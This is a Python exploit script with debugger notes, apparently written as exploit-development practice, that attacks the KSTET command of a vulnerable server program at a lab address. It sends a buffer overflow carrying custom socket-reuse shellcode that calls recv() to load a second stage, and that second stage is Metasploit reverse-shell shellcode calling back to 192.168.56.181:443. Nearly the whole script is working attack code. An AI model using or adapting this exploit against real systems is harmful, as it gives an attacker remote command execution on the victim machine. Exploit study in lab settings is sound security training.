#!/usr/bin/env python2
import os, sys, time
from socket import socket, AF_INET, SOCK_STREAM

host=(("192.168.56.4",9999))



NOTES = """
## located the name recv in WS2_32.dll
## POINTS TO: 
71AB615A >   8BFF           MOV EDI,EDI
## Set a breakpoint on the instruction it points to
## Sent the payload.  Breakpoint hit.
## When WS2_32.recv is called, the stack reads:
00B6FA08   00401958  /CALL to recv from vulnserv.00401953   <--
00B6FA0C   0000007C  |Socket = 7C
00B6FA10   003D4818  |Buffer = 003D4818
00B6FA14   00001000  |BufSize = 1000 (4096.)
00B6FA18   00000000  \Flags = 0

##  Examining the instruction at 00401953:
CALL <JMP.&WS2_32.recv>
## right-click and "Assemble", shows the address being called:
CALL 0040252C
		^^ Address to call in order to call WS2_32.recv, after setting up the stack.

## If I set a breakpoint on the CALL <JMP.&WS2_32.recv> instruction, this way I can see how the stack is set up for the call.  When the breakpoint is hit, Looking at previous instructions leading to it, it shows where the socket_FD is grabbed from!

## At the breakpoint, the stack looks like this, with ESP pointing to the top value:
00B6FA0C   0000007C  |Socket = 7C
00B6FA10   003D4818  |Buffer = 003D4818
00B6FA14   00001000  |BufSize = 1000 (4096.)
00B6FA18   00000000  \Flags = 0

## The two instructions before the CALL <JMP.&WS2_32.recv) instruction>:
0040194A  |. 8B85 E0FBFFFF  |MOV EAX,DWORD PTR SS:[EBP-420]          ; |
00401950  |. 890424         |MOV DWORD PTR SS:[ESP],EAX              ; |

## Which means, the sock_FD is grabbed from EBP-420 then moved into the stack @esp!
## EBP at this time is:
00B6FFB4

## EBP at the time of crash and when ready to start setting up the call stack is 41414141, so that won't work.
## But, we can add the delta between crash-time ESP and call-time EBP when CALL <JMP.&WS2_32.recv>, adding the delta to crash-time ESP, and subtract the 0x420 from that, which is where the sock_FD will be!

## recv() call-time EBP - 0x420:
## echo "ibase=16;obase=10; 00B6FFB4 - 420" |bc
## 00B6FB94  #dword ptr sock_FD
## dword ptr sock_FD - crash-time ESP:
## echo "ibase=16;obase=10; 00B6FB94 - 00B6FA0C" |bc
## 188		## need to add this to ESP after short jump back to beginning of payload


#####################################
Based on these discoveries, the solution appears to be:

00B6F9C6   54               PUSH ESP
00B6F9C7   58               POP EAX
00B6F9C8   80EC 03          SUB AH,3
00B6F9CB   50               PUSH EAX
00B6F9CC   5C               POP ESP				# ^-.:  grab ESP into eax, sub 256*3, mov esp,eax
00B6F9CD   8BD8             MOV EBX,EAX			# dest buffer, also jmp here later.
00B6F9CF   66:05 8804       ADD AX,488			# ptr sock_FD is here!
00B6F9D3   8B08             MOV ECX,DWORD PTR DS:[EAX]	# mov ECX, sock_FD!
00B6F9D5   33D2             XOR EDX,EDX
00B6F9D7   52               PUSH EDX			# recv() flags!
00B6F9D8   80C6 03          ADD DH,3
00B6F9DB   52               PUSH EDX			# recv size!
00B6F9DC   53               PUSH EBX			# buf!
00B6F9DD   51               PUSH ECX			# sock_FD!
00B6F9DE   33C0             XOR EAX,EAX
00B6F9E0   05 112C2540      ADD EAX,40252C11
00B6F9E5   C1E8 08          SHR EAX,8
00B6F9E8   FFD0             CALL EAX            # ^-.: <JMP.&WS2_32.recv>
00B6F9EA   FFE4             JMP ESP				# buf!

"""		## End NOTES


sploit = "KSTET "
sploit += "/.:/" 
# sploit += "A"*(5005-4) # crash!!!
# sploit += sys.argv[1]  # ./kstet_recv.py $(`locate pattern_create.rb |head -n 1` 5001) # 41326341
# `locate pattern_offset.rb |head -n 1` 41326341 5001  # 66

sploit += (
"\x54"					# PUSH ESP
"\x58"              	# POP EAX
"\x80\xEC\x03"         	# SUB AH,3
"\x50"              	# PUSH EAX
"\x5C"              	# POP ESP
"\x8B\xD8"            	# MOV EBX,EAX
"\x66\x05\x88\x04"      # ADD AX,488
"\x8B\x08"           	# MOV ECX,DWORD PTR DS:[EAX]
"\x33\xD2"           	# XOR EDX,EDX
"\x52"              	# PUSH EDX
"\x80\xC6\x02"         	# ADD DH,2			# note: crashed wrong when bufsz = 256*3, so -1.
"\x52"              	# PUSH EDX
"\x53"              	# PUSH EBX
"\x51"              	# PUSH ECX
"\x33\xC0"            	# XOR EAX,EAX
"\x05\x11\x2c\x25\x40"  # ADD EAX,40252C11
"\xC1\xE8\x08"         	# SHR EAX,8
"\xFF\xD0"            	# CALL EAX                                 ; <JMP.&WS2_32.recv>
"\xFF\xE3"            	# JMP EBX
) # 38 bytes

sploit += "A"*(66-38)

# sploit += "B"*4
# 62501203   FFE4             JMP ESP
sploit += "\x03\x12\x50\x62" # jmp esp essfunc.dll # DllCharacteristics = 0x0
sploit += "\x90"*2

# echo "ibase=16;obase=10; 100-48" |bc  
# B8
sploit += "\xeb\xb6"  # jmp short -0x48 = 0xB8, + -2 for the two ops, = 0xb6
# sploit += "C"*(5001 - 66 - 4 - 2 - 2)   # Don't really need this anymore.


stage2 = "\x90"*24
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.181 LPORT=443 EXITFUNC=thread  -b "\x00" -e x86/shikata_ga_nai -i 1 -f c
stage2 += (
"\xdd\xc0\xba\x16\xf8\xbd\x27\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x4f\x83\xee\xfc\x31\x56\x15\x03\x56\x15\xf4\x0d\x41\xcf\x71"
"\xed\xba\x10\xe1\x67\x5f\x21\x33\x13\x2b\x10\x83\x57\x79\x99"
"\x68\x35\x6a\x2a\x1c\x92\x9d\x9b\xaa\xc4\x90\x1c\x1b\xc9\x7f"
"\xde\x3a\xb5\x7d\x33\x9c\x84\x4d\x46\xdd\xc1\xb0\xa9\x8f\x9a"
"\xbf\x18\x3f\xae\x82\xa0\x3e\x60\x89\x99\x38\x05\x4e\x6d\xf2"
"\x04\x9f\xde\x89\x4f\x07\x54\xd5\x6f\x36\xb9\x06\x53\x71\xb6"
"\xfc\x27\x80\x1e\xcd\xc8\xb2\x5e\x81\xf6\x7a\x53\xd8\x3f\xbc"
"\x8c\xaf\x4b\xbe\x31\xb7\x8f\xbc\xed\x32\x12\x66\x65\xe4\xf6"
"\x96\xaa\x72\x7c\x94\x07\xf1\xda\xb9\x96\xd6\x50\xc5\x13\xd9"
"\xb6\x4f\x67\xfd\x12\x0b\x33\x9c\x03\xf1\x92\xa1\x54\x5d\x4a"
"\x07\x1e\x4c\x9f\x31\x7d\x19\x6c\x0f\x7e\xd9\xfa\x18\x0d\xeb"
"\xa5\xb2\x99\x47\x2d\x1c\x5d\xa7\x04\xd8\xf1\x56\xa7\x18\xdb"
"\x9c\xf3\x48\x73\x34\x7c\x03\x83\xb9\xa9\x83\xd3\x15\x02\x63"
"\x84\xd5\xf2\x0b\xce\xd9\x2d\x2b\xf1\x33\x58\x6c\x66\x7c\xf3"
"\x4a\xc2\x14\x06\xaa\x2d\x5e\x8f\x4c\x47\xb0\xc6\xc7\xf0\x29"
"\x43\x93\x61\xb5\x59\x33\x01\x24\x06\xc3\x4c\x55\x91\x94\x19"
"\xab\xe8\x70\xb4\x92\x42\x66\x45\x42\xac\x22\x92\xb7\x33\xab"
"\x57\x83\x17\xbb\xa1\x0c\x1c\xef\x7d\x5b\xca\x59\x38\x35\xbc"
"\x33\x92\xea\x16\xd3\x63\xc1\xa8\xa5\x6b\x0c\x5f\x49\xdd\xf9"
"\x26\x76\xd2\x6d\xaf\x0f\x0e\x0e\x50\xda\x8a\x2e\xb3\xce\xe6"
"\xc6\x6a\x9b\x4a\x8b\x8c\x76\x88\xb2\x0e\x72\x71\x41\x0e\xf7"
"\x74\x0d\x88\xe4\x04\x1e\x7d\x0a\xba\x1f\x54"
) # 341
stage2 += "\xCC" * ((256*2)-24-341-1)
stage2 += "\n"

cx = socket(AF_INET,SOCK_STREAM)
cx.connect(host)
cx.send(sploit)
time.sleep(1)
cx.send(stage2)
cx.close()

